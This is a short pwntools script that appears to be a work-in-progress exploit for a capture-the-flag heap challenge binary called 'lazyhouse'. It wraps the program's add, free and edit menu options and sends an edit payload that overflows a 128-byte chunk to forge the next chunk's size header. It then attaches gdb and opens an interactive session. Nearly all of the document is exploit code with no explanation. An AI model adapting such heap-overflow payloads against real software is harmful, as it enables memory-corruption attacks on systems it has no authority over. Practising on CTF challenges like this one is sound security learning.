from pwn import *
io=process("./lazyhouse")

def add(index,size,data):
    io.sendlineafter("Your choice: ","1")
    io.sendlineafter("Index:",str(index))
    io.sendlineafter("Size:",str(size))
    io.sendlineafter("House:",data)


def free(i):
    io.sendlineafter("choice: ",'3')
    io.sendlineafter("Index:",str(i))


def edit(i,payload):
    io.sendlineafter("choice: ",'4')
    io.sendlineafter("Index:",str(i))
    io.sendlineafter("House:",payload)


#add(0,128,"a"*50)
add(0,128,"b"*50)
add(1,128,"c"*50)
#add(2,128,"c"*50)
free(1)
#free(2)
#add(3,188,"d"*50)

pay="a"*128+p64(1000)+p64(0xd0)
pay2="a"*128+p64(0)+p64(0x91)+p64(0)
edit(0,pay2)
#edit(1,pay2)

add(1,128,"1"*10)
#free(0)
#free(2)
#free(3)
#add(2,128,"a"*30)
gdb.attach(io)
io.interactive()
